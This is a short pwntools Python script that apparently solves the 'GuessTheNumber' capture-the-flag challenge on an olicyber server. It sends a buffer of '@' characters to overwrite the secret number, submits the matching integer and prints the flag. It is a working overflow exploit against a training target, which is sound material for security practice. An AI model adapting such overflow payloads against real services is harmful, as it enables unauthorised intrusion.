from pwn import *

LOAD = "@"*8

def connect():
    if args.LOCAL:
        r = process(["./GuessTheNumber"])
    else:
        r = remote('gtn.challs.olicyber.it', 10022)
    return r

conn = connect()

payload = (LOAD*4).encode('ascii')
rand_num = str(int.from_bytes(LOAD.encode('ascii'), byteorder='big')).encode('ascii')

print("[*] PAYLOAD: {}".format(payload))
print("[*] NUMBER: {}".format(rand_num.decode()))

conn.recvuntil(b":")

conn.sendline(payload)
r =conn.recvline();conn.recvline()
conn.sendline(rand_num)

conn.recvline()
flag = conn.recvline().decode().split(" ")[2]

print("[+] FLAG: {}".format(flag))
conn.close()